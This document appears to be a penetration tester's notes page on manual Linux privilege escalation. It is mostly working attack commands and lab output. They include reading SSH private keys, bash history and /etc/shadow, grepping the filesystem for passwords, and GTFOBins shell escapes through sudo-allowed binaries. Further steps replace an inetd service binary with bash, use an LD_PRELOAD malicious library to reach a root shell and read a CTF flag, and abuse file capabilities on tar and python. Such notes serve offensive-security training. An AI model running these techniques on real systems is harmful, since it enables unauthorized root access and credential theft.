---
description: Manual privilege escalation techniques to look for
---

# Linux

## Information gathering

The first step when landing on host should be understanding who your against to - what OS, what process are running,  what users exists and more, this can be done by looking at the following files \(remember - in Linux everything is a file\):

### **Distribution type:** 

`cat /etc/*-release` 

### Kernel version: 

`cat /proc/version`   
`uname -a` 

### view if you can run anything as sudo: \(check for GTFObins\) 

`Sudo -l` 

### Check common files: 

```text
cat /etc/profile 
cat /etc/bashrc 
cat ~/.bash_history 
cat ~/.bashrc 
cat ~/.bash_logout
```

### What services running \(filter by root\): 

`ps aux` 

`ps -efww` - in full screen

`ps -ef` 

`top` 

### Check configuration files: 

```text
cat /etc/syslog.conf 
cat /etc/chttp.conf 
cat /etc/lighttpd.conf 
cat /etc/cups/cupsd.conf 
cat /etc/inetd.conf 
cat /etc/apache2/apache2.conf 
cat /etc/my.conf 
cat /etc/httpd/conf/httpd.conf 
cat /opt/lampp/etc/httpd.conf
```

###  Check local ports and what listens: 

`netstat -antup` 

### View list of users: 

`cat /etc/passwd | cut -d: -f1`  

### Search for ssh keys: 

```text
cat ~/.ssh/authorized_keys 
cat ~/.ssh/identity.pub 
cat ~/.ssh/identity 
cat ~/.ssh/id_rsa.pub 
cat ~/.ssh/id_rsa 
cat ~/.ssh/id_dsa.pub 
cat ~/.ssh/id_dsa 
cat /etc/ssh/ssh_config 
cat /etc/ssh/sshd_config 
cat /etc/ssh/ssh_host_dsa_key.pub 
cat /etc/ssh/ssh_host_dsa_key 
cat /etc/ssh/ssh_host_rsa_key.pub 
cat /etc/ssh/ssh_host_rsa_key 
cat /etc/ssh/ssh_host_key.pub 
cat /etc/ssh/ssh_host_key 
```

### View crontabs

```text
crontab -e root 
crontab -l 
ls -alh /var/spool/cron 
ls -al /etc/ | grep cron 
ls -al /etc/cron* 
cat /etc/cron* 
cat /etc/at.allow 
cat /etc/at.deny 
cat /etc/cron.allow 
cat /etc/cron.deny 
cat /etc/crontab 
cat /etc/anacrontab 
cat /var/spool/cron/crontabs/root 
```

### Web servers files

```text
ls -alhR /var/www/ 
ls -alhR /srv/www/htdocs/ 
ls -alhR /usr/local/www/apache22/data/ 
ls -alhR /opt/lampp/htdocs/ 
ls -alhR /var/www/html/ 
```

## Useful Find Comands

### Find Binaries that will execute as the owner \(SUID\): 

`find / -perm -u=s -type f 2>/dev/null` 

### Find binaries that will execute as the group \(GUID\): 

`find / -perm -g=s -type f 2>/dev/null` 

### Find sticky-bit binaries: 

`find / -perm -1000 -type d 2>/dev/null` 

### Find files which were created in the last 5 minutes: 

`find . -mtime -5 -type f -print 2>/dev/null` 

### Find certain files: 

`find / -name foo.txt -type f` 

### Wildcard search: 

`find . -name "*.txt"`  

### Find and ls: 

`find . -type f -name "Foo*" -exec ls -l` 

### Find world writable folders: 

`find / -writable -type d 2>/dev/null      # world-writeable folders` 

`find / -perm -222 -type d 2>/dev/null     # world-writeable folders` 

`find / -perm -o w -type d 2>/dev/null     # world-writeable folders` 

`find / -perm -o x -type d 2>/dev/null     # world-executable folders` 

`find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders` 

### Files containing passwords: 

`grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`   
`find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;` 

## Sudo misconfiguration  

A common privilege escalation technique, find misconfigred sudo instance where you can run a software with root privileges \(or any other users\).

A list of softwares and how to esclate privileges can be found here:

[https://gtfobins.github.io/](https://gtfobins.github.io/)

GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

**Example:**

```text
Nmap 
nmap --interactive 
nmap> !sh 

Vim #1 
vim -c ':!/bin/sh' 

Vim #2 
:set shell=/bin/sh 
:shell 

Perl 
exec "/bin/sh"; 
perl -e 'exec "/bin/sh";' 

Ruby 
Ruby -e 'exec "/bin/sh"' 

ftp 
 ftp > !/bin/sh or !/bin/bash 
 
gdb 
 gdb > !/bin/sh or !/bin/bash 

Awk 
awk 'BEGIN {system("/bin/bash")}' 

Python 
python -c 'import os; os.system("/bin/sh")'
```

A offline version of GTFOBins:

[https://github.com/nccgroup/GTFOBLookup](https://github.com/nccgroup/GTFOBLookup)

**Example**:

```text
root@DESKTOP99:/opt/GTFOBLookup# python3 gtfoblookup.py linux shell nmap 
nmap: 
    shell: 
gtfoblookup.py:335: YAMLLoadWarning: calling yaml.load_all() without Loader=... is deprecated, as the default Loader is unsafe. Please read https://msg.pyyaml.org/load for full details. 
  for data in md: 
        Description: Input echo is disabled. 
        Code: TF=$(mktemp) 
              echo 'os.execute("/bin/sh")' > $TF 
              nmap --script=$TF 
        Description: The interactive mode, available on versions 2.02 to 
                     5.21, can be used to execute shell commands. 
        Code: nmap --interactive 
              nmap> !sh 
```



## inetd

`cat /etc/inetd.conf` Look for write permissions on any of the executables listed in this config file. If you have write permissions replace the executable i.e. cp /bin/bash /usr/sbin/in.rshd 

inetd will now serve the /bin/bash shell running with root privileges when we connect to the rshd default port 514: 

telnet remote\_ip\_address 514 

From &lt;[https://www.engetsu-consulting.com/tag/Linux-Privilege-Escalation](https://www.engetsu-consulting.com/tag/Linux-Privilege-Escalation)&gt;

## Dynamically Linked Shared Object Library

Find SUID or GUID  

`find / -perm -g=s -o -perm -u=s -type f 2>/dev/null` 

Find a executable which looks suspicious and shouldn't be there: 

```text
james@attackdefense:~$ find / -perm -u=s -type f 2>/dev/null 
/bin/umount 
/bin/mount 
/bin/su 
/usr/bin/passwd 
/usr/bin/chfn 
/usr/bin/gpasswd 
/usr/bin/newgrp 
/usr/bin/chsh 
/usr/local/bin/welcome <---- hmmm 
```

Trying to run the file: 

`james@attackdefense:~/.lib$ /usr/local/bin/welcome/usr/local/bin/welcome: symbol lookup error: /usr/local/bin/welcome: undefined symbol: greetings` 

Check what shared libraries are used: 

```text
james@attackdefense:~$ ldd /usr/local/bin/welcome 
        linux-vdso.so.1 (0x00007ffda84ad000) 
        libgreetings.so => not found 
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff13ab2b000) 
        /lib64/ld-linux-x86-64.so.2 (0x00007ff13b11e000)
```

We will use LD\_PRELOAD  - LD\_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library \(libc.so\) This is called preloading a library. 

First we will need to create a malicious file instead of the missing library 

use the SUID Shell code and compile the code 

`james@attackdefense:~/.lib$ gcc -o libgreetings.so lib.c -shared` 

* the '-shared' is to compile it as a shared library file \(.so\) 

Load the file with the new library: 

`james@attackdefense:~/.lib$ LD_PRELOAD=/home/james/.lib/libgreetings.so /usr/local/bin/welcome` 

Run it: 

```text
lib.c:6:2: warning: implicit declaration of function 'setresuid'; did you mean 'setreuid'? [-Wimplicit-function-declaration] 
  setresuid(0, 0, 0); 
  ^~~~~~~~~ 
  setreuid 
lib.c:7:2: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration] 
  system("/bin/bash"); 
  ^~~~~~ 
james@attackdefense:~/.lib$ ls -l 
total 12 
-rw-r--r-- 1 james james  130 Oct 30 14:51 lib.c 
-rwxr-xr-x 1 james james 7960 Oct 30 14:54 libgreetings.so 
james@attackdefense:~/.lib$ /usr/local/bin/welcome
Enter your name 
id 
root@attackdefense:~/.lib# ls 
lib.c  libgreetings.so 
root@attackdefense:~/.lib# cd /home/root 
bash: cd: /home/root: No such file or directory 
root@attackdefense:~/.lib# cd /root/ 
root@attackdefense:/root# ls 
flag 
root@attackdefense:/root# cat flag 
521d81adc77627782df4bc545ec604de 
root@attackdefense:/root# 
```

## Abuse Capabilities utility

Capabilities are a little obscure but similar in principle to SUID. Linux’s thread/process privilege checking is based on capabilities: flags to the thread that indicate what kind of additional privileges they’re allowed to use. By default, root has all of them. 

Capabilities are useful when you want to restrict your own processes after performing privileged operations \(e.g. after setting up chroot and binding to a socket\). However, they can be exploited by passing them malicious commands or arguments which are then run as root. 

\*Used with GTFOBins 

Find out what capabilities are Enabled 

`[user@box ~]$ getcap -r / 2>/dev/null` 

You will get output like the following… 

```text
/usr/bin/ping = cap_net_admin,cap_net_raw+p 
/usr/sbin/mtr = cap_net_raw+ep 
/usr/sbin/suexec = cap_setgid,cap_setuid+ep 
/usr/sbin/arping = cap_net_raw+p 
/usr/sbin/clockdiff = cap_net_raw+p 
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep 
/home/user/tcpdump = cap_net_admin,cap_net_raw+ep 
/home/user/openssl =ep 
```

### CAP\_DAC\_READ\_SEARCH 

For example if we found

`/home/nxnjz/tar = cap_dac_read_search+ep` 

 tar has cap\_dac\_read\_search capabilities. This means it has read access to anything. We could use this to read SSH keys, or /etc/shadow and get password hashes. 

```text
nxnjz@test-machine:~$ cat /etc/shadow 
cat: /etc/shadow: Permission denied 
```

But since tar has that capability, we can archive /etc/shadow, extract it from the archive and read it. 

```text
nxnjz@test-machine:~$ ls 
tar 
nxnjz@test-machine:~$ ./tar -cvf shadow.tar /etc/shadow 
./tar: Removing leading `/’ from member names 
/etc/shadow 
nxnjz@test-machine:~$ ls 
shadow.tar tar 
nxnjz@test-machine:~$ ./tar -xvf shadow.tar 
etc/shadow 
nxnjz@test-machine:~$ ls 
etc shadow.tar tar 
nxnjz@test-machine:~$ cat etc/shadow 
root:$1$xyz$Bf.3hZ4SmETM3A78n1nWr.:17735:0:99999:7::: 
```

### CAP\_setuid 

```text
/usr/bin/setcap -r /bin/ping            # remove 
/usr/bin/setcap cap_net_raw+p /bin/ping # add 
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7 
$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")' 
sh-5.0# id 
uid=0(root) gid=1000(swissky) 
```

### CAP\_NET\_RAW 

Can capture data as root 

`Tcpdump -ni {Interface}`  

